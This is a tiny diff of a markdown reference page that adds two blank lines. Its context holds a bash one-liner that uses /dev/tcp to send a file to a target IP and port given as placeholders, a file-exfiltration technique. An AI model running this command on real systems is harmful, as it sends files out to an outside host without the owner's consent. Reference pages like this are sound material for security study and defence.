@@ -14,3 +14,5 @@ updated_at: '2023-03-14T01:24:10.854795+00:00'
 ```bash
 cat > /dev/tcp/$_TARGET_IP/$_TARGET_PORT < $_FILENAME
 ```
+
+
